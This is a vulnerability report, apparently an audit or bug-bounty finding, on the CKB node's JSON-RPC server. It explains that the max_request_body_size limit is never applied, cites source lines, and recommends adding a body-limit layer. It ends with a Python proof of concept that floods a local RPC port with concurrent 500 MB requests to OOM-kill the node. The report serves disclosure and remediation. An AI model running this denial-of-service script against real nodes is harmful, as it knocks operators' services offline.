### Title
`max_request_body_size` Config Value Is Never Enforced in the HTTP/WebSocket RPC Server, Allowing Unbounded Memory Consumption via Oversized Requests - (File: `rpc/src/server.rs`)

### Summary
The CKB node's JSON-RPC server reads a `max_request_body_size` configuration value (defaulting to 10 MiB) but **never applies it** to the axum HTTP/WebSocket server. The `start_server` function builds the axum router without any body-size-limiting middleware layer, so the configured limit is silently ignored. An RPC caller can POST arbitrarily large request bodies, causing the axum handler to buffer the entire payload into memory before processing, leading to unbounded memory growth and potential OOM-kill of the node process.

### Finding Description

The `RpcConfig` struct declares `max_request_body_size: usize` and the default config sets it to 10 MiB: [1](#0-0) [2](#0-1) 

In `RpcServer::new()`, the `config` object (including `max_request_body_size`) is received, but when `start_server` is called for both the HTTP and WebSocket endpoints, only `address`, `handler`, and `enable_websocket` are forwarded — `max_request_body_size` is never passed: [3](#0-2) 

Inside `start_server`, the axum `Router` is assembled with only `CorsLayer::permissive()` and `TimeoutLayer` — no `RequestBodyLimitLayer` or equivalent is present anywhere: [4](#0-3) 

The `handle_jsonrpc` handler receives `req_body: Bytes` — axum buffers the entire request body into a heap allocation before the handler is invoked, with no enforced cap: [5](#0-4) 

A codebase-wide search for `RequestBodyLimit`, `body_limit`, or `BodyLimit` returns zero matches, confirming no body size enforcement exists anywhere in the RPC stack.

The TCP RPC server does apply a per-line limit of 2 MiB via `LinesCodec::new_with_max_length`, but the HTTP and WebSocket paths have no equivalent protection: [6](#0-5) 

Additionally, `rpc_batch_limit` is `None` by default (commented out in the shipped config), so the batch-size guard in `handle_jsonrpc` is also inactive by default: [7](#0-6) [8](#0-7) 

### Impact Explanation
**High.** An attacker who can reach the RPC HTTP port sends one or more POST requests with multi-gigabyte JSON bodies. The axum runtime buffers each body fully into heap memory before `handle_jsonrpc` is called. Sending several such requests concurrently exhausts available RAM, triggering an OOM-kill of the `ckb` process. This terminates all node services: block relay, sync, transaction pool, and RPC — a complete denial of service. The node must be manually restarted.

### Likelihood Explanation
**Medium.** By default the RPC binds to `127.0.0.1:8114`, restricting direct internet exposure. However:
- Many operators expose the RPC port to broader networks (e.g., for dApp backends, mining pools, or monitoring), which is explicitly warned against but commonly done.
- The WebSocket endpoint (`ws_listen_address`) is served by the same unprotected `start_server` path and is increasingly enabled (v0.120.0 made it default).
- Any local process on the same machine (e.g., a compromised dependency, a malicious script, or a co-located service) can reach `127.0.0.1:8114` without any authentication.
- The attack requires only a standard HTTP client and a large payload — no special knowledge of CKB internals.

### Recommendation
Apply `tower_http::limit::RequestBodyLimitLayer` to the axum router in `start_server`, wiring in `config.max_request_body_size`. Pass the value through from `RpcServer::new`:

```rust
use tower_http::limit::RequestBodyLimitLayer;

fn start_server(
    rpc: &Arc<MetaIoHandler<Option<Session>>>,
    address: String,
    handler: Handle,
    enable_websocket: bool,
    max_request_body_size: usize,   // <-- add parameter
) -> Result<SocketAddr, AnyError> {
    // ...
    let app = Router::new()
        .route("/", method_router.clone())
        .route("/{*path}", method_router)
        .route("/ping", get(ping_handler))
        .layer(Extension(Arc::clone(rpc)))
        .layer(CorsLayer::permissive())
        .layer(RequestBodyLimitLayer::new(max_request_body_size))  // <-- enforce limit
        .layer(TimeoutLayer::with_status_code(
            StatusCode::REQUEST_TIMEOUT,
            Duration::from_secs(30),
        ))
        .layer(Extension(stream_config));
```

Also enable `rpc_batch_limit` by default in the shipped `ckb.toml` to prevent unbounded batch-request memory amplification.

### Proof of Concept

With a CKB node running with default config (`127.0.0.1:8114`):

```python
import requests, threading

url = "http://127.0.0.1:8114/"
# 500 MB JSON body — the "params" value is an arbitrarily large hex string
payload = '{"id":1,"jsonrpc":"2.0","method":"send_transaction","params":["' + "aa" * 250_000_000 + '"]}'

def attack():
    try:
        requests.post(url, data=payload, headers={"Content-Type": "application/json"})
    except Exception:
        pass

threads = [threading.Thread(target=attack) for _ in range(8)]
for t in threads: t.start()
for t in threads: t.join()
```

Each concurrent request causes axum to allocate ~500 MB on the heap before `handle_jsonrpc` is reached. Eight concurrent requests attempt to allocate ~4 GB, exhausting memory on typical node hardware and triggering an OOM-kill of the `ckb` process.

### Citations

**File:** util/app-config/src/configs/rpc.rs (L39-40)
```rust
    /// Max request body size in bytes.
    pub max_request_body_size: usize,
```

**File:** resource/ckb.toml (L186-187)
```text
# Default is 10MiB = 10 * 1024 * 1024
max_request_body_size = 10485760
```

**File:** resource/ckb.toml (L205-208)
```text
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
```

**File:** rpc/src/server.rs (L52-78)
```rust
    pub fn new(config: RpcConfig, io_handler: IoHandler, handler: Handle) -> Self {
        if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
            let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
        }

        let rpc = Arc::new(io_handler);

        let http_address = Self::start_server(
            &rpc,
            config.listen_address.to_owned(),
            handler.clone(),
            false,
        )
        .inspect(|&local_addr| {
            info!("Listen HTTP RPCServer on address: {}", local_addr);
        })
        .unwrap();

        let ws_address = if let Some(addr) = config.ws_listen_address {
            let local_addr =
                Self::start_server(&rpc, addr, handler.clone(), true).inspect(|&addr| {
                    info!("Listen WebSocket RPCServer on address: {}", addr);
                });
            local_addr.ok()
        } else {
            None
        };
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/server.rs (L165-165)
```rust
            let codec = LinesCodec::new_with_max_length(2 * 1024 * 1024);
```

**File:** rpc/src/server.rs (L218-231)
```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
    let make_error_response = |error| {
        Json(jsonrpc_core::Failure {
            jsonrpc: Some(jsonrpc_core::Version::V2),
            id: jsonrpc_core::Id::Null,
            error,
        })
        .into_response()
    };

    let req = match std::str::from_utf8(req_body.as_ref()) {
```

**File:** rpc/src/server.rs (L274-282)
```rust
            Request::Batch(calls) => {
                if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
                    && calls.len() > *batch_size
                {
                    return make_error_response(jsonrpc_core::Error::invalid_params(format!(
                        "batch size is too large, expect it less than: {}",
                        batch_size
                    )));
                }
```
